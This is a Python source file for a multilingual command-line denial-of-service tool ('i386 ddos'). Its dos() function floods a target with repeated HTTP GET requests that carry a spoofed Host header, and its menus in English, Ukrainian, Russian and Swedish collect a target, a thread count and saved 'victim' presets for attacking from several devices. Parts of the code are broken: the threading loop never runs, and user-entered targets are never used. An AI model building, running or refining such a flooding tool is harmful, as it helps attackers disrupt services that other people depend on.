import socket
import threading
from os import system, name
from time import sleep

#def var
reqcount = 0
target = "192.168.0.1"
fake_ip = '182.83.0.30'
port = 80

#clear screen
def clear():
	if name == "nt":
		_ = system('cls')
	else:
		_ = system('clear')

#dos itself
def dos():
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))   
		global reqcount
		reqcount += 1
		print(reqcount)
		s.close()  
	for i in range(500):
		thread = threading.Thread(target=dos)
		thread.start()
						
def logo():
	print('''
		
██╗██████╗░░█████╗░░█████╗░
██║╚════██╗██╔══██╗██╔═══╝░
██║░█████╔╝╚█████╔╝██████╗░
██║░╚═══██╗██╔══██╗██╔══██╗
██║██████╔╝╚█████╔╝╚█████╔╝
╚═╝╚═════╝░░╚════╝░░╚════╝░

██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░
''')





##########
#en menu lol#
##########
def enmenu():
	while True:
		logo()
		print("Menu:\n1 - Start DDOS\n2 - Start preset DDOS\n3 - Options\n4 - Exit.")
		menu = input("Option number: ")
		
#start dos with info gather
		if(menu=="1"):
			clear()
			logo()
			target = input("Target: ")
			print("Port is 80 by default.")
			threads = input("Enter how many threads: ")
			dos()

#interpret preset variables
		elif(menu=="2"):
			clear()
			logo()
			prei()
		elif(menu=="3"):
			clear()
			logo()
			print("Options:\n1 - Reset language\n2 - Create a target preset\n3 - Exit")
			option = input("Option number: ")
			
			#language reset
			if(option == "1"):
				clear()
				logo()
				text_file = open("config.txt", "w")
				n = text_file.write("nlang")
				text_file.close()
				print("Language reset.")
				while True:
					res = input("Exit now? y/n: ")
					if(res=="y"):
						quit()
					elif(res=="n"):
						clear()
						break
					else:
						print("Invalid option.")
						sleep(1)
						clear()
						logo()
			
			#preset write
			elif(option == "2"):
				clear()
				logo()
				print("Welcome to preset wizard. This option is used rarely, but can come in handy if you need to execute the attack from a bunch of different devices fast. Please enter your targets information carefully.")
				filename = input("Preset name (only latin and numbers): ")
				print("Your preset will be written to " + filename + ".txt")
				f = open(filename + ".txt", "x")
				print(filename + ".txt created.")
				
				#english preset
				target = input("Target: ")
				print("Port is 80 by default.")
				threads = input("Enter how many threads: ")
				
				#write variables 
				f = open(filename + ".txt", "a")
				f.write(target + '''
''' + threads)
				f.close()
				clear()

			elif(option == "3"):
				clear()
			else:
				print("Invalid option.")
				sleep(1)
				clear()
				
		elif(menu=="4"):
				quit()
		else:
				print("Invalid option.")
				sleep(1)
				clear()
				
				
				

								
##########
#ua menu lol#
##########
def uamenu():
	while True:
		clear()
		logo()
		print("Меню:\n1 - Запустити DDOS\n2 - Запустити DDOS з шаблону\n3 - Налаштування\n4 - Вихід")
		menu = input("Номер опції: ")
		
#start dos with info gather
		if(menu=="1"):
			clear()
			logo()
			target = input("Ціль: ")
			print("Порт є 80 за замовчуванням.")
			threads = input("Введіть кількість потоків: ")
			dos()

#interpret preset variables
		elif(menu=="2"):
			clear()
			logo()
			prei()
			dos()
		elif(menu=="3"):
			clear()
			logo()
			print("Налаштування:\n1 - Скинути мову\n2 - Зробити шаблон цілі\n3 - Вихід")
			option = input("Номер опції: ")
			
			#language reset
			if(option == "1"):
				clear()
				logo()
				text_file = open("config.txt", "w")
				n = text_file.write("nlang")
				text_file.close()
				print("Скидання мови успішне.")
				while True:
					res = input("Вийти зараз? y - так, n - ні: ")
					if(res=="y"):
						quit()
					elif(res=="n"):
						clear()
						break
					else:
						print("Неможливий аргумент.")
						sleep(1)
						clear()
						logo()
			
			#preset write
			elif(option == "2"):
				clear()
				logo()
				print("Ласкаво просимо до мастера створення шаблонів. Ця можливість рідко використовується, але може знадобитись якщо ви хочете запустити атаку з декількох різних пристроїв швидко. Будь ласка, вводіть інформацію жертви обережно.")
				filename = input("Ім'я нового шаблону (тільки латиниця і цифри): ")
				print("Ваш шаблон буде записаний до файлу " + filename + ".txt")
				f = open(filename + ".txt", "x")
				print(filename + ".txt створений.")
				
				#english preset
				target = input("Ціль: ")
				print("Порт є 80 за замовчуванням.")
				threads = input("Введіть кількість потоків: ")
				
				#write variables 
				f = open(filename + ".txt", "a")
				f.write(target + '''
''' + threads)
				f.close()
				clear()

			elif(option == "3"):
				clear()
			else:
				print("Invalid option.")
				sleep(1)
				clear()
				
		elif(menu=="4"):
				quit()
		else:
				print("Неможливий аргумент.")
				sleep(1)
				clear()
				
				
				
				

								
##########
#ru menu lol#
##########
def rumenu():
	while True:
		clear()
		logo()
		print("Меню:\n1 - Запустить DDOS\n2 - Запустить DDOS с шаблона\n3 - Настройки\n4 - Выход")
		menu = input("Номер опции: ")
		
#start dos with info gather
		if(menu=="1"):
			clear()
			logo()
			target = input("Цель: ")
			print("Порт 80 по умолчанию.")
			threads = input("Введите количество потоков: ")
			dos()

#interpret preset variables
		elif(menu=="2"):
			clear()
			logo()
			prei()
			dos()
		elif(menu=="3"):
			clear()
			logo()
			print("Настройки:\n1 - Сбросить язык\n2 - Создать шаблон\n3 - Выход")
			option = input("Номер опции: ")
			
			#language reset
			if(option == "1"):
				clear()
				logo()
				text_file = open("config.txt", "w")
				n = text_file.write("nlang")
				text_file.close()
				print("Сброс языка успешен.")
				while True:
					res = input("Выйти сейчас? y - да, n - нет: ")
					if(res=="y"):
						quit()
					elif(res=="n"):
						clear()
						break
					else:
						print("Невозможный аргумент.")
						sleep(1)
						clear()
						logo()
			
			#preset write
			elif(option == "2"):
				clear()
				logo()
				print("Добро пожаловать в мастер создания шаблонов. Эта возможность редко используется, но пригодится если нужно щапустить атаку с нескольких устройств быстро. Пожалуйста, вводите информацию жертвы аккуратно.")
				filename = input("Имя нового шаблона (только латиница і цифры): ")
				print("Ваш шаблон будет записан в файл " + filename + ".txt")
				f = open(filename + ".txt", "x")
				print(filename + ".txt создан.")
				
				#english preset
				target = input("Цель: ")
				print("Порт 80 по умолчанию.")
				threads = input("Введите количество потоков: ")
				
				#write variables 
				f = open(filename + ".txt", "a")
				f.write(target + '''
''' + threads)
				f.close()
				clear()

			elif(option == "3"):
				clear()
			else:
				print("Invalid option.")
				sleep(1)
				clear()
				
		elif(menu=="4"):
				quit()
		else:
				print("Невозможный аргумент.")
				sleep(1)
				clear()
				





##########
#se menu lol#
##########
def semenu():
	while True:
		clear()
		logo()
		print("Meny:\n1 - Starta ddos\n2 - Starta förinställd DDOS\n3 - Alternativ\n4 - Avsluta")
		menu = input("Förinställning namn: ")
		
#start dos with inf gather
		if(menu=="1"):
			clear()
			logo()
			target = input("Mål: ")
			print("Port är 80 som standard.")
			threads = input("Inmata hur många trådar: ")
			dos()

#interpret preset variables
		elif(menu=="2"):
			clear()
			logo()
			prei()
			dos()
		elif(menu=="3"):
			clear()
			logo()
			print("Alternativ:\n1 - Återställ språk\n2 - Skapa en inriktad förinställning\n3 - Avsluta")
			option = input("Förinställning namn: ")
			
			#language reset
			if(option == "1"):
				clear()
				logo()
				text_file = open("config.txt", "w")
				n = text_file.write("nlang")
				text_file.close()
				print("Language reset.")
				while True:
					res = input("Exit now? y/n: ")
					if(res=="y"):
						quit()
					elif(res=="n"):
						clear()
						break
					else:
						print("Invalid option.")
						sleep(1)
						clear()
						logo()
			
			#preset write
			elif(option == "2"):
				clear()
				logo()
				print("Welcome to preset wizard. This option is used rarely, but can come in handy if you need to execute the attack from a bunch of different devices fast. Please enter your targets information carefully.")
				filename = input("Preset name (only latin and numbers): ")
				print("Your preset will be written to " + filename + ".txt")
				f = open(filename + ".txt", "x")
				print(filename + ".txt created.")
				
				#english preset
				target = input("Mål: ")
				print("Port är 80 som standard.")
				threads = input("Inmata hur många trådar: ")
				
				#write variables 
				f = open(filename + ".txt", "a")
				f.write(target + '''
''' + threads)
				f.close()
				clear()

			elif(option == "3"):
				clear()
			else:
				print("Invalid option.")
				sleep(1)
				clear()
				
		elif(menu=="4"):
				quit()
		else:
				print("Invalid option.")
				sleep(1)
				clear()
			
			
			
#get vars from .txt
def prei():
	if(lang == "ennlang"):
		openname = input("Preset name: ") + ".txt"
	elif(lang == "uanlang"):
		openname = input("Ім'я шаблону: ") + ".txt"
	elif(lang == "runlang"):
		openname = input("Имя шаблона: ") + ".txt"
	elif(lang == "senlang"):
		openname = input("Preset name: ") + ".txt"
	f = open(openname, "r")
	target = (f.readline())
	target = target[:-1]
	threads = (f.readline())
	dos()			
				
				
				
#read lang
f = open("config.txt", "r")
lang = (f.read(7))

#lang change
if (lang == "nlang"):
	logo()
	print("Welcome to i386 ddos, my friend.\n")
	lang = input("Language/Мова/Язык/Språk \n   en     ua   ru   se\nPlease choose:") + "nlang"
	if(lang == "ennlang"):
		save = input("Would you like to save your choice? y/n: ")
	elif(lang == "uanlang"):
		save = input("Чи бажаєте ви зберегти ваш вибір? y - так, n - ні: ")
	elif(lang == "runlang"):
		save = input("Хотите ли вы сохранить свой выбор? y - да, n - нет: ")
	elif(lang == "senlang"):
		save = input("Vill du spara ditt val? y/n: ")

#save lang
	if (save == "y"):
		text_file = open("config.txt", "w")
		n = text_file.write(lang)
		text_file.close()
		clear()
		#exit to menu
		if(lang == "ennlang"):
			enmenu()
		elif(lang == "uanlang"):
			uamenu()
		elif(lang == "runlang"):
			rumenu()
		elif(lang == "senlang"):
			semenu()
	elif (save == "n"):
		clear()
		sleep(1)
		#also exit to menu
		if(lang == "ennlang"):
			enmenu()
		elif(lang == "uanlang"):
			uamenu()
		elif(lang == "runlang"):
			rumenu()
		elif(lang == "senlang"):
			semenu()
		
#if its already saved, exit to menu
if(lang == "ennlang"):
	enmenu()
elif(lang == "uanlang"):
	uamenu()
elif(lang == "runlang"):
	rumenu()
elif(lang == "senlang"):
	semenu()